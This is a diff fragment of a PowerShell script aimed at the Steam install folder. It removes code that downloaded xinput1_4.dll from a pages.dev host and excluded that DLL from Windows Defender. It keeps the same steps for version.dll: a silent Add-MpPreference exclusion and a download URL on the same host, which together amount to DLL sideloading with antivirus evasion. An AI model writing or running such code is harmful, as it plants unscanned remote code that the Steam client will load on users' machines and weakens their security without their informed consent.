@@ -58,11 +58,11 @@ if (-not (Test-Path $steamPath -PathType Container)) {
 }
 
 $steamConfigPath = Join-Path $steamPath "config"
-$hidPath = Join-Path $steamPath "xinput1_4.dll"
+
 $verPath = Join-Path $steamPath "version.dll"
         
 Remove-ItemIfExists $verPath
-Remove-ItemIfExists $hidPath
+
 
 function PwStart() {
     try {
@@ -81,22 +81,13 @@ function PwStart() {
 
         $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
         Remove-ItemIfExists $catchPath
-        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
+        
         try { Add-MpPreference -ExclusionPath $verPath -ErrorAction SilentlyContinue } catch {}
 
         $versionDllPath = Join-Path $steamPath "version.dll"
         Remove-ItemIfExists $versionDllPath
 
-        $downloadHidDll = "https://zdb1.pages.dev/xinput1_4.dll"
-
-        try {
-            Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction Stop
-        } catch {
-            if (Test-Path $hidPath) {
-                Move-Item -Path $hidPath -Destination "$hidPath.old" -Force -ErrorAction SilentlyContinue
-                Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction SilentlyContinue
-            }
-        }
+        
 
         $downloadverDll = "https://zdb1.pages.dev/version.dll"
 
